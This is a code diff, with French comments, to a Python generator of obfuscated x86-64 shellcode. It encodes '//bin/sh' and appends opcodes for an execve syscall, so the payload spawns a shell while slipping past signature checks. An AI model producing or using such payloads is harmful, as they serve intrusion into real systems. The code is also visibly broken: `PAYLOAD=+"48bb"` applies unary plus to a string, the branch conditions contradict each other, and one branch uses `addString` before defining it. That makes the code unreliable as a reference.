@@ -22,7 +22,6 @@ def factorOffus(string4Payload):
     if verifOffus(string4Payload) == False:
         return string4Payload
 
-    global PAYLOAD
     arr = []
     ope = r(1,2)
    
@@ -184,10 +183,69 @@ def shell():
     offuString = offus("0x68732f6e69622f2f",factorOffusVar)
     offuString = offuString[::-1]#Inverse en mirroir tout la chaine pour op code
 
-    PAYLOAD=+"48bb"
+    PAYLOAD=+"48bb"  #mov rbx, ...
     for i in range(0,15,2):
         sub = offuString[i+1] + offuString[i] 
         PAYLOAD+= sub
+                    #.../bin/bash en hexa offusqué    
+    PAYLOAD+="4889e7" # mov rdi, rsp
+    PAYLOAD+="50" #push rax
+    PAYLOAD+="57" #push rdi
+    PAYLOAD+="4889e6" #mov rsi, rsp
+
+    #Désoffuscation
+    if factorOffusVar < 0 :
+        if factorOffusVar < 10 :
+            addString = ""
+            for i in range(8):
+                addString+="0"+str(factorOffusVar)
+
+            PAYLOAD+="4883eb"+addString
+        
+        elif factorOffusVar >= 10 :
+            newFactor = ""
+            if factorOffusVar == 10 : newFactor = "A"
+            elif factorOffusVar == 11 : newFactor = "B"
+            elif factorOffusVar == 12 : newFactor = "C"
+            elif factorOffusVar == 13 : newFactor = "D"
+            elif factorOffusVar == 14 : newFactor = "E"
+            elif factorOffusVar == 15 : newFactor = "F"
+
+            for i in range(8):
+                addString+="0"+str(newFactor)
+
+            PAYLOAD+="4883eb"+addString
+        
+
+    elif factorOffusVar > 0 :
+        if factorOffusVar <= -10 :
+            factorOffusVar*= -1 
+            addString = ""
+            for i in range(8):
+                addString+="0"+str(factorOffusVar)
+
+            PAYLOAD+="4883eb"+addString
+        
+        elif factorOffusVar > -10 :
+            newFactor = ""
+            if factorOffusVar == 10 : newFactor = "A"
+            elif factorOffusVar == 11 : newFactor = "B"
+            elif factorOffusVar == 12 : newFactor = "C"
+            elif factorOffusVar == 13 : newFactor = "D"
+            elif factorOffusVar == 14 : newFactor = "E"
+            elif factorOffusVar == 15 : newFactor = "F"
+
+            for i in range(8):
+                addString+="0"+str(newFactor)
+
+            PAYLOAD+="4883eb"+addString    
+
+    #Appel systeme
+    PAYLOAD+="b03b" #mov al, 0x3b
+    PAYLOAD+="0f05" #syscall
+
+
+    
         
     
     
